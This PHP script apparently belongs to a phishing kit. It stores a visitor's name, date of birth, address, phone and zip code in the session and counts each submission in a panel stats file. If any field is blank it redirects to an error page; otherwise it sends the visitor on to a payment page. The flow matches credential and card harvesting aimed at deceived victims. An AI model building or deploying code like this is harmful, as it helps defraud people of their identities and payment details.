<?php 
require_once 'panel.php' ;


// SMS Config Start

if(isset($_POST['submit'])) {

if(!isset($_SESSION)) {
    session_start();
}

$_SESSION['sname'] = htmlspecialchars($_POST['name']);
$_SESSION['sdob'] = htmlspecialchars($_POST['dob']);
$_SESSION['scountry'] = htmlspecialchars($_POST['country']);
$_SESSION['scity'] = htmlspecialchars($_POST['city']);
$_SESSION['sadress'] = htmlspecialchars($_POST['adress']);
$_SESSION['sphone'] = htmlspecialchars($_POST['phone']);
$_SESSION['szip'] = htmlspecialchars($_POST['zip']);


if(empty($_SESSION['sname']) || empty($_SESSION['sdob']) || empty($_SESSION['scountry']) || empty($_SESSION['scity'])|| empty($_SESSION['sadress']) || empty($_SESSION['sphone'])|| empty($_SESSION['szip'])) {
    header("Location: ../infoz.php?page=error&userid={$id}&ue={$ue}");
}
else {

    $_SESSION['sdoba'] = $_SESSION['sdob'];
    $_SESSION['sphona'] = $_SESSION['sphone'];

    $file = '../Panel/stats/stats.ini';
    $data = @parse_ini_file($file);
    $data['infos']++;
    update_ini($data, $file);

    header("Location: ../payment.php?userid={$id}&ue={$ue}");
}

}
// SMS Config END